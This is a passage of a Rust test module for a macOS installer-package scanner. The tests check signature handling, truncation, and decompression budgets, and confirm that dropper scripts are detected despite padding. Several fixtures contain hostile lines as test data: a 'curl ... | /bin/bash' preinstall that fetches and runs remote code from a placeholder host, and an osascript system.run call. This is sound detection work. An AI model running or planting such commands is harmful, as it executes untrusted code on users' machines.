                matches!(UnsignedPackageRule.evaluate(&ctx(name, body)), Ok(None)),
                "{name}"
            );
        }
    }

    /// A container we couldn't read in full must degrade completeness, not pass clean.
    #[test]
    fn an_unreadable_package_is_not_applicable() {
        let full = pkg!("benign");
        // Truncated so the TOC's byte range is no longer present.
        let c = ctx("benign.pkg", &full[..40]);
        assert!(matches!(
            InstallerScriptRule.evaluate(&c),
            Err(RuleOutcome::NotApplicable)
        ));
        assert!(matches!(
            UnsignedPackageRule.evaluate(&c),
            Err(RuleOutcome::NotApplicable)
        ));
    }

    #[test]
    fn pkgbuild_output_is_unsigned() {
        let c = ctx("benign.pkg", pkg!("benign"));
        let signal = UnsignedPackageRule
            .evaluate(&c)
            .expect("evaluates")
            .expect("pkgbuild output carries no signature");
        assert_eq!(signal.id, "unsigned-installer-package");
        assert_eq!(signal.category, SignalCategory::ProvenanceConcern);
        assert!(signal.weight < 15, "must not alert on its own");
    }

    fn truncated_ctx(name: &str, body: &[u8]) -> ScanContext {
        ScanContext {
            truncated: true,
            ..ctx(name, body)
        }
    }

    /// Content starting with the xar magic might hide the deciding bytes
    /// (TOC, scripts, signature) past the cap — not covered.
    #[test]
    fn covers_truncation_false_for_xar_magic() {
        let c = truncated_ctx("x.pkg", b"xar!\x00\x1c\x00\x01");
        assert!(!InstallerScriptRule.covers_truncation(&c));
        assert!(!UnsignedPackageRule.covers_truncation(&c));
    }

    /// Content that plainly isn't a xar archive has nothing this rule could
    /// have missed past the cap.
    #[test]
    fn covers_truncation_true_for_non_xar_content() {
        let c = truncated_ctx("app", b"\xfe\xed\xfa\xcf");
        assert!(InstallerScriptRule.covers_truncation(&c));
        assert!(UnsignedPackageRule.covers_truncation(&c));
    }

    fn signed_toc_ctx(toc_body: &str, tail: usize) -> ScanContext {
        let mut bytes = crate::xar::toc_xar_bytes(toc_body);
        bytes.extend(std::iter::repeat(0u8).take(tail));
        ctx("p.pkg", &bytes)
    }

    fn fires_unsigned(c: &ScanContext) -> bool {
        matches!(UnsignedPackageRule.evaluate(c), Ok(Some(_)))
    }

    #[test]
    fn a_bare_top_level_signature_does_not_count_as_signed() {
        assert!(fires_unsigned(&signed_toc_ctx(
            r#"<signature style="RSA"/>"#,
            64
        )));
    }

    #[test]
    fn a_nested_only_signature_does_not_count_as_signed() {
        let body = r#"<file id="1"><name>x</name><signature style="RSA"><offset>0</offset><size>8</size></signature></file>"#;
        assert!(fires_unsigned(&signed_toc_ctx(body, 64)));
    }

    #[test]
    fn a_signature_range_past_the_archive_end_does_not_count_as_signed() {
        let body = r#"<signature style="RSA"><offset>0</offset><size>1000</size></signature>"#;
        assert!(fires_unsigned(&signed_toc_ctx(body, 64)));
        let body = r#"<signature style="RSA"><offset>1000</offset><size>8</size></signature>"#;
        assert!(fires_unsigned(&signed_toc_ctx(body, 64)));
    }

    #[test]
    fn an_in_range_top_level_signature_counts_as_signed() {
        let body = r#"<signature style="RSA"><offset>0</offset><size>64</size></signature>"#;
        assert!(matches!(
            UnsignedPackageRule.evaluate(&signed_toc_ctx(body, 64)),
            Ok(None)
        ));
    }

    /// The range is checked against the true file length, not the held
    /// prefix, so a signature past a truncated capture still counts.
    #[test]
    fn a_signature_past_the_held_prefix_but_within_the_file_counts_as_signed() {
        let body = r#"<signature style="RSA"><offset>0</offset><size>64</size></signature>"#;
        let full = signed_toc_ctx(body, 64);
        let held = full.content.as_ref().unwrap().len() - 64;
        let c = ScanContext {
            content: Some(full.content.as_ref().unwrap()[..held].to_vec()),
            truncated: true,
            file_len: full.file_len,
            ..full
        };
        assert!(matches!(UnsignedPackageRule.evaluate(&c), Ok(None)));
    }

    /// On a truncated embedded capture the length is only what was captured,
    /// so a signature range past it is undetermined, not bogus.
    #[test]
    fn a_signature_past_a_truncated_embedded_capture_is_not_applicable() {
        let body = r#"<signature style="RSA"><offset>0</offset><size>1000</size></signature>"#;
        let full = signed_toc_ctx(body, 64);
        let c = ScanContext {
            source: ContentSource::Embedded,
            truncated: true,
            ..full
        };
        assert!(matches!(
            UnsignedPackageRule.evaluate(&c),
            Err(RuleOutcome::NotApplicable)
        ));
    }

    /// Different categories on purpose — see module docs.
    #[test]
    fn the_two_package_rules_are_independent_categories() {
        assert_ne!(
            InstallerScriptRule.category(),
            UnsignedPackageRule.category()
        );
    }

    // --- per-archive read-back budget (#76) -------------------------------

    const ZLIB_ORDINARY: &[u8] =
        include_bytes!("../../testdata/inflate/zlib_distribution_ordinary.in");
    const ZLIB_DROPPER: &[u8] =
        include_bytes!("../../testdata/inflate/zlib_distribution_dropper.in");

    fn small_limits() -> xar::XarLimits {
        xar::XarLimits {
            max_entry_bytes: 4096,
            max_read_back_bytes: 8192,
            ..xar::XarLimits::default()
        }
    }

    /// A `Distribution` file for heap bytes `[offset, offset + len)`, wrapped
    /// in `depth` directories.
    fn distribution_at(offset: usize, len: usize, depth: usize) -> String {
        let mut s = format!(
            r#"<file><name>Distribution</name><type>file</type><data><offset>{offset}</offset><length>{len}</length><size>{len}</size></data></file>"#
        );
        for _ in 0..depth {
            s = format!("<file><name>d</name><type>directory</type>{s}</file>");
        }
        s
    }

    /// A xar with `toc_body` and a heap of `ZLIB_ORDINARY` then `ZLIB_DROPPER`.
    fn budget_archive(toc_body: &str) -> Vec<u8> {
        let mut bytes = xar::toc_xar_bytes(toc_body);
        bytes.extend_from_slice(ZLIB_ORDINARY);
        bytes.extend_from_slice(ZLIB_DROPPER);
        bytes
    }

    fn benign(depth: usize) -> String {
        distribution_at(0, ZLIB_ORDINARY.len(), depth)
    }

    fn dropper(depth: usize) -> String {
        distribution_at(ZLIB_ORDINARY.len(), ZLIB_DROPPER.len(), depth)
    }

    /// `n` padding `Distribution`s at `depth`, each over its own copy of the
    /// benign blob, then (if `dropper_depth` is set) the dropper.
    ///
    /// `lead` puts an ordinary depth-0 `Distribution` first in the TOC, so
    /// the rest (including a depth-0 dropper) is read in the low-priority group.
    fn distinct_padding_archive(
        n: usize,
        depth: usize,
        dropper_depth: Option<usize>,
        lead: bool,
    ) -> Vec<u8> {
        let len = ZLIB_ORDINARY.len();
        let lead_at = n * len + ZLIB_DROPPER.len();
        let mut toc = if lead {
            distribution_at(lead_at, len, 0)
        } else {
            String::new()
        };
        toc += &(0..n)
            .map(|i| distribution_at(i * len, len, depth))
            .collect::<String>();
        if let Some(d) = dropper_depth {
            toc += &distribution_at(n * len, ZLIB_DROPPER.len(), d);
        }
        let mut bytes = xar::toc_xar_bytes(&toc);
        for _ in 0..n {
            bytes.extend_from_slice(ZLIB_ORDINARY);
        }
        bytes.extend_from_slice(ZLIB_DROPPER);
        bytes.extend_from_slice(ZLIB_ORDINARY);
        bytes
    }

    fn evaluate_small(
        bytes: &[u8],
        limits: &xar::XarLimits,
    ) -> (Result<Option<MatchedSignal>, RuleOutcome>, ScanContext) {
        let c = ctx("b.pkg", bytes);
        (InstallerScriptRule.evaluate_with(&c, limits), c)
    }

    #[test]
    fn many_entries_over_the_budget_are_incomplete_and_bounded() {
        let limits = small_limits();
        let one = budget_archive(&benign(0));
        assert!(matches!(evaluate_small(&one, &limits).0, Ok(None)));

        let many = distinct_padding_archive(50, 0, None, false);
        let (r, _) = evaluate_small(&many, &limits);
        assert!(matches!(r, Err(RuleOutcome::NotApplicable)), "{r:?}");

        // The same reads, directly: the work stays within the budget.
        let a = xar::parse(&many, &limits).expect("xar");
        let mut budget = xar::ReadBudget::new(&limits);
        let entries: Vec<_> = a.metadata_entries().collect();
        let mut refused = 0;
        for (i, f) in entries.iter().enumerate() {
            budget.start_entry(entries.len() - i);
            // A read cut short by its allowance carries a gap.
            if !matches!(budget.read_entry_partial(&many, &a, f), Ok((_, None))) {
                refused += 1;
            }
        }
        assert!(budget.remaining() <= limits.max_read_back_bytes);
        assert!(refused > 20, "{refused}");
    }

    #[test]
    fn a_small_dropper_is_read_despite_nested_padding() {
        // A share covers the dropper's dynamic block, not a padding read.
        let limits = xar::XarLimits {
            max_read_back_bytes: 96 * 1024,
            ..small_limits()
        };
        let (r, c) = evaluate_small(&distinct_padding_archive(50, 1, Some(0), true), &limits);
        let signal = r.expect("evaluates").expect("the dropper scores");
        assert!(
            signal.description.contains("launches an interpreter"),
            "{}",
            signal.description
        );
        assert!(c.marked_incomplete("installer-script-suspicious"));
    }

    #[test]
    fn an_entry_the_budget_cannot_reach_is_unread_not_clean() {
        let limits = small_limits();
        let toc = format!("{}{}", benign(0).repeat(50), dropper(1));
        // The dropper's compressed bytes alone exceed the whole budget.
        let tiny = xar::XarLimits {
            max_read_back_bytes: ZLIB_DROPPER.len() - 1,
            ..limits
        };
        let (r, _) = evaluate_small(&budget_archive(&toc), &tiny);
        assert!(matches!(r, Err(RuleOutcome::NotApplicable)), "{r:?}");

        // Control: with room to read it, the dropper is found.
        let roomy = xar::XarLimits {
            max_read_back_bytes: 1 << 20,
            ..limits
        };
        let (r, _) = evaluate_small(&budget_archive(&toc), &roomy);
        assert!(r.expect("evaluates").is_some());
    }

    /// A tight allowance cuts the outer read and leaves the inner gzip little:
    /// incomplete, never clean.
    #[test]
    fn a_tight_allowance_leaves_a_zlib_scripts_incomplete() {
        let full = include_bytes!("../../testdata/gzip/scripts_dropper.in");
        let bytes = pkg_with_scripts(&zlib_stored(full));
        for spare in [0, 5] {
            let limits = xar::XarLimits {
                max_entry_bytes: 4096,
                max_read_back_bytes: full.len() + spare,
                ..xar::XarLimits::default()
            };
            let (r, c) = evaluate_small(&bytes, &limits);
            match r {
                Err(RuleOutcome::NotApplicable) => {}
                Ok(Some(_)) => assert!(c.marked_incomplete("installer-script-suspicious")),
                other => panic!("spare {spare}: {other:?}"),
            }
        }

        // Control: enough budget reads the same archive complete.
        let (r, c) = evaluate_small(&bytes, &small_limits());
        assert!(r.expect("evaluates").is_some());
        assert!(!c.marked_incomplete("installer-script-suspicious"));
    }

    /// A stored `Distribution` over the entry cap whose script is inside the
    /// cap: the prefix scores, and the cut is reported.
    #[test]
    fn a_stored_dropper_distribution_over_the_cap_scores_and_marks_incomplete() {
        let mut dist =
            br#"<a><script>system.run("/usr/bin/osascript", "-e", "x");</script></a>"#.to_vec();
        let script_end = dist.len();
        dist.resize(script_end + 300, b' ');
        let limits = xar::XarLimits {
            max_entry_bytes: script_end + 10,
            ..xar::XarLimits::default()
        };
        let (r, c) = evaluate_small(&pkg_with_distribution(&dist), &limits);
        let signal = r.expect("evaluates").expect("the prefix scores");
        assert!(
            signal.description.contains("references osascript"),
            "{}",
            signal.description
        );
        assert!(c.marked_incomplete("installer-script-suspicious"));
    }

    /// A benign zlib `Distribution` of about 6 KB, past the 4096-byte entry cap.
    fn padding_blob() -> Vec<u8> {
        let mut doc = b"<installer-gui-script><title>x</title>".to_vec();
        doc.resize(6000, b' ');
        doc.extend_from_slice(b"</installer-gui-script>");
        zlib_stored(&doc)
    }

    /// `padding` top-level padding entries, then the dropper last in the TOC.
    /// `distinct` gives each padding entry its own heap bytes; otherwise they
    /// share one blob.
    fn padded_dropper_archive(padding: usize, distinct: bool) -> Vec<u8> {
        let pad = padding_blob();
        let copies = if distinct { padding } else { 1 };
        let mut toc = String::new();
        for i in 0..padding {
            let at = if distinct { i * pad.len() } else { 0 };
            toc += &distribution_at(at, pad.len(), 0);
        }
        toc += &distribution_at(copies * pad.len(), ZLIB_DROPPER.len(), 0);
        let mut bytes = xar::toc_xar_bytes(&toc);
        for _ in 0..copies {
            bytes.extend_from_slice(&pad);
        }
        bytes.extend_from_slice(ZLIB_DROPPER);
        bytes
    }

    /// Padding that decodes past the entry cap cannot starve a dropper that
    /// comes after it in the TOC.
    #[test]
    fn same_depth_padding_does_not_starve_the_dropper() {
        // Spending first-come, the padding would use up the budget in twelve reads.
        let limits = xar::XarLimits {
            max_entry_bytes: 4096,
            max_read_back_bytes: 120_000,
            ..xar::XarLimits::default()
        };
        for distinct in [false, true] {
            let (r, c) = evaluate_small(&padded_dropper_archive(16, distinct), &limits);
            let signal = r.expect("evaluates").expect("the dropper scores");
            assert!(
                signal.description.contains("launches an interpreter"),
                "{}",
                signal.description
            );
            assert!(c.marked_incomplete("installer-script-suspicious"));
        }
    }

    #[test]
    fn a_dropper_is_found_among_many_padding_entries() {
        let limits = xar::XarLimits {
            max_entry_bytes: 4096,
            // A share covers the dropper's dynamic block, not a padding read.
            max_read_back_bytes: 360 * 1024,
            ..xar::XarLimits::default()
        };
        let (r, c) = evaluate_small(&distinct_padding_archive(200, 0, Some(0), true), &limits);
        let signal = r.expect("evaluates").expect("the dropper scores");
        assert!(signal.description.contains("launches an interpreter"));
        assert!(c.marked_incomplete("installer-script-suspicious"));
    }

    /// A `Scripts` entry (zlib on the heap) then a dropper `Distribution`: the
    /// cheaper `Distribution` is read first but reported second.
    fn scripts_then_distribution(scripts_blob: &[u8]) -> Vec<u8> {
        let toc = format!(
            r#"<file id="1"><name>Scripts</name><type>file</type><data><offset>{}</offset><length>{}</length><size>{}</size></data></file>{}"#,
            ZLIB_DROPPER.len(),
            scripts_blob.len(),
            scripts_blob.len(),
            distribution_at(0, ZLIB_DROPPER.len(), 0)
        );
        let mut bytes = xar::toc_xar_bytes(&toc);
        bytes.extend_from_slice(ZLIB_DROPPER);
        bytes.extend_from_slice(scripts_blob);
        bytes
    }

    #[test]
    fn findings_are_reported_in_toc_order_and_match_unlimited_limits() {
        let gz = include_bytes!("../../testdata/gzip/scripts_dropper.in");
        let scripts = zlib_stored(gz);
        assert!(scripts.len() > ZLIB_DROPPER.len(), "Scripts is read second");
        let bytes = scripts_then_distribution(&scripts);

        let (small, c) = evaluate_small(&bytes, &small_limits());
        let small = small.expect("evaluates").expect("scores");
        let scripts_at = small.description.find("install script").expect("scripts");
        let dist_at = small.description.find("distribution script").expect("dist");
        assert!(scripts_at < dist_at, "{}", small.description);
        assert!(!c.marked_incomplete("installer-script-suspicious"));

        let (big, _) = evaluate_small(&bytes, &xar::XarLimits::default());
        let big = big.expect("evaluates").expect("scores");
        assert_eq!(
            (small.weight, small.description),
            (big.weight, big.description)
        );
    }

    /// Plain cpio `Scripts` whose read uses the whole allowance has no gzip
    /// layer left to read: complete, not unreadable.
    #[test]
    fn a_plain_cpio_scripts_read_that_lands_on_the_allowance_is_complete() {
        for (body, scores) in [
            (&b"echo hi\n"[..], false),
            (
                &b"#!/bin/bash\ncurl -fsSL https://example.invalid/a.sh | /bin/bash\n"[..],
                true,
            ),
        ] {
            let mut cpio = odc_member("preinstall", body);
            cpio.extend(odc_member("TRAILER!!!", b""));
            // Stored cpio cannot nest: half the allowance is input, half its copy.
            let bytes = pkg_with_scripts(&cpio);
            let cost = 2 * cpio.len();
            let exact = xar::XarLimits {
                max_entry_bytes: 1 << 20,
                max_read_back_bytes: cost,
                ..xar::XarLimits::default()
            };
            let (r, c) = evaluate_small(&bytes, &exact);
            assert_eq!(r.expect("complete").is_some(), scores);
            assert!(!c.marked_incomplete("installer-script-suspicious"));

            // One byte less cuts the outer read: never clean.
            let tight = xar::XarLimits {
                max_read_back_bytes: cost - 1,
                ..exact
            };
            let (r, c) = evaluate_small(&bytes, &tight);
            match r {
                Err(RuleOutcome::NotApplicable) => {}
                Ok(Some(_)) => assert!(c.marked_incomplete("installer-script-suspicious")),
                other => panic!("{other:?}"),
            }
        }
    }

    /// A gzip of small stored DEFLATE blocks: the plaintext sits in the raw
    /// bytes, and a cut lands mid-block as truncation, not as a budget error.
    fn gzip_stored(inner: &[u8]) -> Vec<u8> {
        let mut gz = vec![0x1f, 0x8b, 0x08, 0, 0, 0, 0, 0, 0, 3];
        let chunks: Vec<&[u8]> = inner.chunks(60).collect();
        for (i, chunk) in chunks.iter().enumerate() {
            let n = u16::try_from(chunk.len()).expect("small");
            gz.push(u8::from(i + 1 == chunks.len()));
            gz.extend_from_slice(&n.to_le_bytes());
            gz.extend_from_slice(&(!n).to_le_bytes());
            gz.extend_from_slice(chunk);
        }
        gz.extend_from_slice(&[0; 8]);
        gz
    }

    /// An odc cpio holding a scoring `preinstall`.
    fn scoring_cpio() -> Vec<u8> {
        let body = b"#!/bin/bash\ncurl -fsSL https://example.invalid/a.sh | /bin/bash\n".repeat(6);
        let mut cpio = odc_member("preinstall", &body);
        cpio.extend(odc_member("TRAILER!!!", b""));
        cpio
    }

    /// A `Scripts` read cut at any per-member cap is incomplete, never clean.
    #[test]
    fn a_budget_cut_scripts_read_is_incomplete() {
        let gz = gzip_stored(&scoring_cpio());
        let blob = zlib_stored(&gz);
        let bytes = pkg_with_scripts(&blob);

        for outer_out in [5, 40, 140, 300, 480] {
            let limits = xar::XarLimits {
                max_entry_bytes: outer_out,
                ..xar::XarLimits::default()
            };
            let (r, c) = evaluate_small(&bytes, &limits);
            match r {
                Err(RuleOutcome::NotApplicable) => {}
                Ok(Some(_)) => assert!(c.marked_incomplete("installer-script-suspicious")),
                other => panic!("{outer_out}: {other:?}"),
            }
        }
    }

    /// A gzip-in-gzip `Scripts` (not split for nesting) whose outer read uses
    /// the whole allowance leaves the inner gzip none: the inner bytes are
    /// scanned raw, and the entry is incomplete, never clean.
    #[test]
    fn a_gzip_scripts_entry_the_budget_cannot_decode_is_incomplete() {
        let blob = include_bytes!("../../testdata/inflate/gzip_scripts_gzip_stored.in");
        let bytes = pkg_with_scripts(blob);
        // The input fits in half; its block and output then take the rest.
        let limits = xar::XarLimits {
            max_entry_bytes: 1 << 20,
            max_read_back_bytes: 2 * blob.len() + 300 + crate::inflate::DYNAMIC_BLOCK_WORK,
            ..xar::XarLimits::default()
        };
        let (r, c) = evaluate_small(&bytes, &limits);
        let found = r
            .expect("evaluates")
            .expect("the raw text scores")
            .description;
        assert!(found.contains("install scripts (unparsed)"), "{found}");
        assert!(c.marked_incomplete("installer-script-suspicious"));

        // With room for the inner layer the cpio member is scanned.
        let roomy = xar::XarLimits {
            max_read_back_bytes: 1 << 20,
            ..limits
        };
        let (r, _) = evaluate_small(&bytes, &roomy);
        let found = r.expect("evaluates").expect("scores").description;
        assert!(found.contains("install script preinstall"), "{found}");
        assert!(!found.contains("unparsed"), "{found}");
    }

    /// A zlib `Scripts` cut on input still leaves room to decode part of the
    /// inner gzip, so its cut-short member is scanned (#110).
    #[test]
    fn a_cut_outer_read_still_decodes_the_inner_gzip() {
        let gz = include_bytes!("../../testdata/gzip/scripts_dropper_long.in");
        let blob = zlib_stored(gz);
        let limits = xar::XarLimits {
            max_entry_bytes: 1 << 20,
            // The inner third also pays the dynamic block's 1 KiB charge.
            max_read_back_bytes: 4500,
            ..xar::XarLimits::default()
        };
        assert!(
            blob.len() > limits.max_read_back_bytes / 3,
            "outer read is cut"
        );
        let (r, c) = evaluate_small(&pkg_with_scripts(&blob), &limits);
        let signal = r.expect("evaluates").expect("the decoded prefix scores");
        assert!(
            signal.description.contains("(cut short)"),
            "{}",
            signal.description
        );
        assert!(
            !signal.description.contains("unparsed"),
            "{}",
            signal.description
        );
        assert!(c.marked_incomplete("installer-script-suspicious"));
    }

    /// A zlib `Scripts` whose output compresses well is cut on output, not
    /// input, and still leaves the inner gzip room for its first member (#110).
    #[test]
    fn a_compressible_outer_read_leaves_the_inner_gzip_room() {
        let blob = include_bytes!("../../testdata/inflate/zlib_scripts_gzip_stored.in");
        let limits = xar::XarLimits {
            max_entry_bytes: 1 << 20,
            max_read_back_bytes: 3000,
            ..xar::XarLimits::default()
        };
        assert!(3 * blob.len() <= limits.max_read_back_bytes, "input fits");
        let (r, c) = evaluate_small(&pkg_with_scripts(blob), &limits);
        let found = r
            .expect("evaluates")
            .expect("the member scores")
            .description;
        assert!(
            found.contains("install script preinstall (cut short)"),
            "{found}"
        );
        assert!(!found.contains("unparsed"), "{found}");
        assert!(c.marked_incomplete("installer-script-suspicious"));
    }

    /// Evaluates `Scripts` = zlib(`gz`) under `limits`; returns the signal
    /// description (empty if none) and whether the rule marked a gap.
    fn scripts_description(gz: &[u8], limits: &xar::XarLimits) -> (String, bool) {
        let (r, c) = evaluate_small(&pkg_with_scripts(&zlib_stored(gz)), limits);
        let found = r.ok().flatten().map(|s| s.description).unwrap_or_default();
        (found, c.marked_incomplete("installer-script-suspicious"))
    }

    /// A member cut at the per-member cap leaves no unread input: the cut
    /// member is scanned, the compressed bytes are not again (#81).
    #[test]
    fn a_limit_cut_inner_gzip_is_not_scanned_raw() {
        let limits = xar::XarLimits {
            max_entry_bytes: 300,
            ..xar::XarLimits::default()
        };
        let (found, gap) = scripts_description(&gzip_stored(&scoring_cpio()), &limits);
        assert!(
            found.contains("install script preinstall (cut short)"),
            "{found}"
        );
        assert!(!found.contains("unparsed"), "{found}");
        assert!(gap);
    }

    /// A damaged trailer: the decoded members are scanned once, not again as
    /// raw stored-block text.
    #[test]
    fn a_damaged_inner_gzip_is_not_counted_twice() {
        let (found, gap) =
            scripts_description(&gzip_stored(&scoring_cpio()), &xar::XarLimits::default());
        assert!(found.contains("install script preinstall"), "{found}");
        assert!(!found.contains("unparsed"), "{found}");
        assert!(gap);
    }

    /// A gzip of `n` empty fixed-Huffman blocks, then a final stored block of
    /// `tail`: valid, but past inflate's work cap before the tail.
    fn gzip_padded_with_empty_blocks(n: usize, tail: &[u8]) -> Vec<u8> {
        let mut gz = vec![0x1f, 0x8b, 0x08, 0, 0, 0, 0, 0, 0, 3];
        // Each block is BFINAL=0, BTYPE=01, end-of-block (7 zero bits).
        let mut bits = Vec::with_capacity(n * 10 + 3);
        for _ in 0..n {
            bits.extend_from_slice(&[0, 1, 0, 0, 0, 0, 0, 0, 0, 0]);
        }
        bits.extend_from_slice(&[1, 0, 0]); // final stored block
        for byte in bits.chunks(8) {
            gz.push(byte.iter().enumerate().map(|(i, b)| b << i).sum());
        }
        let len = u16::try_from(tail.len()).expect("small");
        gz.extend_from_slice(&len.to_le_bytes());
        gz.extend_from_slice(&(!len).to_le_bytes());
        gz.extend_from_slice(tail);
        gz.extend_from_slice(&[0; 8]);
        gz
    }

    /// The allowance stops the inner gzip's block work before its stored
    /// block: that unread text is still scanned raw.
    #[test]
    fn script_text_past_the_inner_work_cap_is_scanned_raw() {
        let gz = gzip_padded_with_empty_blocks(400_000, &scoring_cpio());
        let limits = xar::XarLimits {
            max_read_back_bytes: 16 << 20,
            ..xar::XarLimits::default()
        };
        assert!(400_000 * crate::inflate::BLOCK_WORK > limits.max_read_back_bytes);
        let (found, gap) = scripts_description(&gz, &limits);
        assert!(found.contains("install scripts (unparsed)"), "{found}");
        assert!(gap);
    }

    /// A zlib `Scripts` entry that decodes to `1f 8b` plus a non-gzip header
    /// and a plaintext script, kept only up to the cap: the script text inside
    /// that prefix is still scanned.
    #[test]
    fn a_cut_scripts_entry_with_a_broken_inner_layer_is_scanned_as_text() {
        let mut inner = vec![0x1f, 0x8b, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff];
        inner.extend_from_slice(
            b"\n#!/bin/bash\ncurl -fsSL https://example.invalid/a.sh | /bin/bash\n",
        );
        let prefix = inner.len();
        inner.resize(prefix + 600, b' ');
        let bytes = pkg_with_scripts(&zlib_stored(&inner));
        let limits = xar::XarLimits {
            max_entry_bytes: prefix + 20,
            ..xar::XarLimits::default()
        };
        let (r, c) = evaluate_small(&bytes, &limits);
        let signal = r.expect("evaluates").expect("the prefix scores");
        assert!(signal.weight > 0);
        assert!(c.marked_incomplete("installer-script-suspicious"));
    }

    const BZIP2_DROPPER: &[u8] = include_bytes!("../../testdata/bzip2/distribution_dropper.in");

    /// `n` top-level `Scripts` entries over the heap bytes `[0, len)`.
    fn scripts_toc(len: usize, n: usize) -> String {
        format!(
            r#"<file><name>Scripts</name><type>file</type><data><offset>0</offset><length>{len}</length><size>{len}</size></data></file>"#
        )
        .repeat(n)
    }

    /// Unreadable entries (heap ranges outside the archive) take no share of
    /// the budget, so a bzip2 dropper among them is still read.
    #[test]
    fn unreadable_entries_do_not_dilute_a_bzip2_droppers_share() {
        assert_eq!(crate::bzip2::block_size(BZIP2_DROPPER), Some(900_000));
        let mut toc = distribution_at(0, BZIP2_DROPPER.len(), 0);
        toc += &distribution_at(1 << 30, 1000, 0).repeat(300);
        let mut bytes = xar::toc_xar_bytes(&toc);
        bytes.extend_from_slice(BZIP2_DROPPER);

        let (r, c) = evaluate_small(&bytes, &xar::XarLimits::default());
        let signal = r.expect("evaluates").expect("the dropper scores");
        assert!(
            signal.description.contains("launches an interpreter"),
            "{}",
            signal.description
        );
        assert!(c.marked_incomplete("installer-script-suspicious"));
    }

    /// A bzip2 entry costs a block, so it is read after the many small
    /// entries and gets what they left.
    #[test]
    fn a_bzip2_entry_among_many_small_ones_is_read_last_and_in_full() {
        let mut cpio = odc_member("preinstall", b"#!/bin/sh\necho hello\n");
        cpio.extend(odc_member("TRAILER!!!", b""));
        let mut toc = distribution_at(0, BZIP2_DROPPER.len(), 0);
        toc += &scripts_toc(cpio.len(), 400).replace(
            "<offset>0</offset>",
            &format!("<offset>{}</offset>", BZIP2_DROPPER.len()),
        );
        let mut bytes = xar::toc_xar_bytes(&toc);
        bytes.extend_from_slice(BZIP2_DROPPER);
        bytes.extend_from_slice(&cpio);

        let (r, c) = evaluate_small(&bytes, &xar::XarLimits::default());
        let got = r.expect("evaluates").expect("the dropper scores");
        assert!(!c.marked_incomplete("installer-script-suspicious"));

        let unlimited = xar::XarLimits {
            max_read_back_bytes: usize::MAX / 2,
            ..xar::XarLimits::default()
        };
        let (r, c) = evaluate_small(&bytes, &unlimited);
        let want = r.expect("evaluates").expect("the dropper scores");
        assert!(!c.marked_incomplete("installer-script-suspicious"));
        assert_eq!(
            (got.weight, got.description),
            (want.weight, want.description)
        );
    }

    /// A gzip of `empty_blocks` empty stored blocks: no output, a few KB in.
    fn empty_gzip(empty_blocks: usize) -> Vec<u8> {
        let mut gz = vec![0x1f, 0x8b, 0x08, 0, 0, 0, 0, 0, 0, 3];
        for _ in 0..empty_blocks {
            gz.extend_from_slice(&[0x00, 0x00, 0x00, 0xff, 0xff]);
        }
        gz.extend_from_slice(&[0x01, 0x00, 0x00, 0xff, 0xff]);
        gz.extend_from_slice(&[0; 8]);
        gz
    }

    /// A `Scripts` read is charged its outer input and output and the inner
    /// gzip's output and block work; the inner input is the outer output, not
    /// charged again. A budget with room for exactly `k` such reads makes `k`
    /// in full.
    #[test]
    fn a_scripts_entrys_inner_gzip_input_is_charged_once() {
        let gz = empty_gzip(600);
        let blob = zlib_stored(&gz);
        // Outer input, output and stored block; the inner gzip reads the
        // output and writes nothing, at a block charge for each of its 601 blocks.
        let per_entry = blob.len() + gz.len() + 602 * crate::inflate::BLOCK_WORK;
        assert!(per_entry >= 3 * blob.len(), "input fits in a third");
        let k = 3;
        let limits = xar::XarLimits {
            max_entry_bytes: 1 << 20,
            // Slack past `k` reads, so the next is a real cut read.
            max_read_back_bytes: k * per_entry + blob.len(),
            ..xar::XarLimits::default()
        };
        let mut bytes = xar::toc_xar_bytes(&scripts_toc(blob.len(), 2 * k));
        bytes.extend_from_slice(&blob);
        let c = ctx("b.pkg", &bytes);
        let archive = xar::parse(&bytes, &limits).expect("xar");
        let mut budget = xar::ReadBudget::new(&limits);

        let mut charged = Vec::new();
        for entry in &archive.files {
            budget.start_entry(1);
            let before = budget.remaining();
            let mut found = ScriptFindings::default();
            // The empty archive is not complete either way; only the charge matters.
            let max = limits.max_entry_bytes;
            let zips = &mut ZipAllowance::new(&ZipLimits::default());
            let _ = scan_scripts_entry(&c, &archive, entry, &mut budget, max, zips, &mut found);
            charged.push(before - budget.remaining());
        }
        // `k` full reads, then only cut ones from what is left.
        assert_eq!(charged[..k], vec![per_entry; k]);
        assert!(charged[k] > 0, "{charged:?}");
        assert!(charged[k..].iter().all(|c| *c < per_entry), "{charged:?}");
        assert_eq!(
            charged.iter().sum::<usize>(),
            limits.max_read_back_bytes - budget.remaining()
        );

        // Through the rule, the same archive is never reported clean.
        let (r, _) = evaluate_small(&bytes, &limits);
        assert!(matches!(r, Err(RuleOutcome::NotApplicable)), "{r:?}");
    }

    /// Heap under construction; `add` returns the `(offset, length)` it landed at.
    #[derive(Default)]
    struct Heap(Vec<u8>);

    impl Heap {
        fn add(&mut self, bytes: &[u8]) -> (usize, usize) {
            let at = self.0.len();
            self.0.extend_from_slice(bytes);
            (at, bytes.len())
        }
    }

    fn file(name: &str, (offset, len): (usize, usize)) -> String {
        format!(
            r#"<file><name>{name}</name><type>file</type><data><offset>{offset}</offset><length>{len}</length><size>{len}</size></data></file>"#
        )
    }

    /// `leaf` inside the `/`-separated directories of `path` (none if empty).
    fn nested(path: &str, leaf: String) -> String {
        let dirs = path.split('/').filter(|d| !d.is_empty());
        dirs.rev().fold(leaf, |inner, d| {
            format!("<file><name>{d}</name><type>directory</type>{inner}</file>")
        })
    }

    fn archive(toc: &str, heap: &Heap) -> Vec<u8> {
        let mut bytes = xar::toc_xar_bytes(toc);
        bytes.extend_from_slice(&heap.0);
        bytes
    }

    /// A `Scripts` blob (zlib over gzip over cpio) whose `member` is a dropper.
    fn scripts_blob(member: &str) -> Vec<u8> {
        let body = b"#!/bin/bash\ncurl -fsSL https://example.invalid/a.sh | /bin/bash\n".repeat(6);
        let mut cpio = odc_member(member, &body);
        cpio.extend(odc_member("TRAILER!!!", b""));
        zlib_stored(&gzip_stored(&cpio))
    }

    fn distribution_xml(refs: &[&str]) -> Vec<u8> {
        let refs: String = refs
            .iter()
            .map(|r| format!(r#"<pkg-ref id="x">{r}</pkg-ref>"#))
            .collect();
        format!("<installer-gui-script>{refs}</installer-gui-script>").into_bytes()
    }

    /// `n` unreferenced `Distribution`/`Scripts` entries, each a distinct 200-byte
    /// window of one shared blank blob: cheaper than any real `Scripts`.
    fn padding(heap: &mut Heap, n: usize) -> String {
        const WINDOW: usize = 200;
        let (base, _) = heap.add(&vec![b' '; n + WINDOW]);
